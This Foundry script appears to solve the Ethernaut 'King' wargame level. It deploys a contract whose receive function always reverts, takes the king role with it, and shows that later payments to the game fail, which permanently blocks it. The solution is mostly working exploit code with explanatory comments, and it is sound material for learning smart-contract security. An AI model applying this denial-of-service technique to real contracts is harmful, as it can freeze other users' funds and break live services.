// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/King.sol";

contract CantReceiveContract {

    /**
     * Make it obvious that contract can't receive any ethers.
     * Another solution is just an empty contract.
     */
    receive() external payable {
        revert();
    }

}

contract KingScript is Script {

    King public king = King(payable(0xb331A36D9bE6452BFfaD52A25A4b578535FEf712));
    /**
     * Solution: Deploy a contract with inital funds and without any receive or fallback function.
     * AKA contract that can't receive any funds.
     * When that contract is king the transfer from King.sol won't work and this will break the game.
     */
    function run() public {
        CantReceiveContract cantReceiver = new CantReceiveContract();
        
        console.log("1. Current king", king._king());
        vm.deal(address(cantReceiver), 1e15);

        // send ethers from contract
        vm.prank(address(cantReceiver));
        address(king).call{value: 1e15}(""); 

        console.log("2. New king", king._king());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        (bool isSuccess, ) = address(king).call{value: 1e16}(""); 
        console.log("3. Still king is", king._king(), "becase response is ", isSuccess);
        vm.stopBroadcast();

    }
}
